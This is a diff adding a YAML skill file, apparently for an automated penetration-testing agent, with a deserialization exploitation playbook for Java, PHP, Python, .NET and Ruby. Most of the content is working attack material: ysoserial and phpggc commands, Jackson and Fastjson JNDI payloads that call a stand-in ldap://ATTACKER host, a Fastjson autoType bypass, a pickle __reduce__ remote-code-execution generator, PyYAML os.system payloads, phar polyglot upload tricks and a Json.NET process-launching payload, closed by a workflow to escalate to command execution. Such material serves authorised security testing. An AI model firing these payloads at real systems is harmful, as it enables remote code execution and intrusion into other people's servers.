@@ -1,0 +1,106 @@
+id: deserialization-chains
+name: "Deserialization Attack Chains"
+description: "Multi-language deserialization exploitation: Java, PHP, Python, .NET, Ruby"
+version: 1
+applicable_roles: [attack, audit]
+tags: [deserialization, rce, java, php, python, dotnet, pickle, ysoserial, phar, gadget-chain]
+triggers:
+  - "unserialize\\s*\\("
+  - "pickle\\.loads?\\s*\\("
+  - "cPickle"
+  - "__reduce__"
+  - "yaml\\.load\\s*\\("
+  - "!!python/object"
+  - "rO0AB"
+  - "application/x-java-serialized-object"
+  - "ysoserial"
+  - "CommonsCollections"
+  - "BinaryFormatter"
+  - "ObjectStateFormatter"
+  - "__VIEWSTATE"
+  - "TypeNameHandling"
+  - "Marshal\\.load"
+  - "phpggc"
+  - "O:\\d+:\"[\\w\\\\]+\":\\d+:\\{"
+  - "Fastjson"
+  - "Jackson.*enableDefaultTyping"
+  - "SnakeYAML"
+  - "\\\\xac\\\\xed\\\\x00\\\\x05"
+estimated_tokens: 750
+content: |
+  ## Deserialization Attack Chains
+
+  ### Step 1: Identify Serialization Format
+  Detect the format from magic bytes, Content-Type, or code patterns:
+  - **Java**: magic `\xac\xed\x00\x05` / base64 `rO0AB`; Content-Type `application/x-java-serialized-object`
+  - **PHP**: `O:8:"stdClass":0:{}` shape in cookies, POST bodies, or hidden fields
+  - **Python pickle**: base64 blobs in cookies (Flask-Session), `.pkl` files, Celery task bodies
+  - **.NET**: `__VIEWSTATE` fields, `SoapFormatter`/`BinaryFormatter` in request bodies
+  - **Ruby**: `\x04\x08` header in base64 cookies (Rack sessions)
+
+  ### Step 2: Java Deserialization
+  **ysoserial gadget chains** (match to classpath):
+  - `java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0` — Apache Commons Collections 3.1
+  - `CommonsCollections5` / `CommonsCollections6` — CC 3.1-3.2.1 (no InvokerTransformer restriction)
+  - `CommonsBeanutils1` — commons-beanutils on classpath
+  - `Spring1` / `Spring2` — Spring Framework apps
+  - `Hibernate1` — Hibernate ORM present
+  - `URLDNS` — **no gadget dependency**, blind detection via DNS callback; always try first
+  - Blind detection: `java -jar ysoserial.jar URLDNS 'http://ATTACKER.oast.id' | base64 -w0`
+
+  **Jackson (enableDefaultTyping / @JsonTypeInfo)**:
+  - Payload: `["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://ATTACKER:1389/obj","autoCommit":true}]`
+  - Requires JNDI injection endpoint (Marshalsec LDAP/RMI server)
+
+  **Fastjson** (versions < 1.2.68):
+  - `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER:1389/obj","autoCommit":true}`
+  - Bypass autoType: `{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://ATTACKER/a","autoCommit":true}`
+
+  **Common Java sinks**: RMI (:1099), JMX, T3 (WebLogic :7001), JMS queues, JSF ViewState, Struts2 OGNL parameters.
+
+  ### Step 3: PHP Deserialization
+  **unserialize() + POP chains**:
+  - Confirm: send `O:8:"stdClass":0:{}` — valid parse = no error; garbage = `unserialize(): Error at offset`
+  - Build chains with **phpggc**: `phpggc Monolog/RCE1 system id | base64 -w0`
+  - Key chains: `Laravel/RCE1-12`, `Symfony/RCE1-6`, `Monolog/RCE1-9`, `Guzzle/RCE1`, `Slim/RCE1`
+  - Fingerprint framework from cookies (laravel_session, XSRF-TOKEN), error traces, headers
+
+  **Phar deserialization** (no direct unserialize call needed):
+  - Upload a phar disguised as `.jpg`/`.png` (phar polyglot)
+  - Trigger via any file operation: `file_exists("phar://uploads/evil.jpg")`, `getimagesize()`, `finfo_file()`
+  - Phar metadata is deserialized automatically — chains same as unserialize()
+
+  ### Step 4: Python Deserialization
+  **pickle RCE** (pickle.loads on attacker data = direct code execution):
+  ```python
+  import pickle, base64, os
+  class E:
+      def __reduce__(self):
+          return (os.system, ('id',))
+  print(base64.b64encode(pickle.dumps(E())).decode())
+  ```
+  Common sinks: Flask-Session (pickle backend), Redis-cached objects, `/tmp/*.pkl`, Celery task serialization, shelve, joblib.load.
+
+  **PyYAML** (yaml.load without SafeLoader):
+  - `!!python/object/apply:os.system ["id"]`
+  - `!!python/object/apply:subprocess.check_output [["id"]]`
+  - Older PyYAML: `!!python/object/new:os.system ["id"]`
+
+  ### Step 5: .NET Deserialization
+  **BinaryFormatter / SoapFormatter / LosFormatter**:
+  - `ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami"`
+  - `ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"`
+
+  **ViewState** (ASP.NET):
+  - Check for `__VIEWSTATE` without MAC validation (no `__VIEWSTATEGENERATOR` or known machine key)
+  - `ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --path="/target.aspx" --apppath="/"`
+
+  **Json.NET TypeNameHandling** (not None):
+  - `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c whoami"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}`
+
+  ### Workflow
+  1. Identify format from magic bytes, headers, or code patterns.
+  2. Send a benign baseline blob to confirm deserialization occurs (error shape reveals parser).
+  3. Start with blind/OOB detection (URLDNS for Java, DNS/HTTP callback for others).
+  4. Match gadget chain to fingerprinted framework/library versions.
+  5. Escalate to command execution; prove with `id`/`whoami`, not flag reads.
